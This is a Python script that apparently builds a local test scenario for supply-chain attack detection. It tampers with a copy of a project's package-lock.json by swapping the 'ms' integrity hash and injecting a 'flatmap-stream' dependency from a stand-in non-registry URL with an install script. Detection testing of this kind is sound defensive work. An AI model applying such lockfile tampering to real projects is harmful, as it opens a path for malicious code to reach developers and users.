"""LOCAL-ONLY simulation of a malicious supply-chain update (nothing is published or downloaded).

Creates <dest> = copy of the target repo whose package-lock.json has been tampered with like a real attack:
  1. integrity hash of an existing package changed WITHOUT a version bump (artifact swap, cf. CDN / registry compromise)
  2. a new transitive package injected, resolved from a non-registry URL, with an install script (cf. event-stream/flatmap-stream)
Usage: python scenarios/tamper_lockfile.py targets/juice-shop targets/juice-shop-tampered
"""
import json, shutil, sys
from pathlib import Path

src, dest = Path(sys.argv[1]), Path(sys.argv[2])
if dest.exists():
    shutil.rmtree(dest)
shutil.copytree(src, dest, ignore=shutil.ignore_patterns("node_modules", ".git", "dist", ".angular"))
base = dest.parent / f"{src.name}.base-package-lock.json"
shutil.copy(src / "package-lock.json", base)
lock = json.loads((dest / "package-lock.json").read_text(encoding="utf-8"))
pk = lock["packages"]
pk["node_modules/ms"]["integrity"] = "sha512-TAMPERED0000000000000000000000000000000000000000000000000000000000000000000000000000000=="
pk["node_modules/flatmap-stream"] = {
    "version": "0.1.1", "resolved": "https://cdn.example.invalid/flatmap-stream-0.1.1.tgz",
    "hasInstallScript": True, "license": "MIT"}
pk["node_modules/morgan"].setdefault("dependencies", {})["flatmap-stream"] = "^0.1.1"
(dest / "package-lock.json").write_text(json.dumps(lock, indent=2), encoding="utf-8")
print(f"baseline lock: {base}\ntampered repo: {dest}")
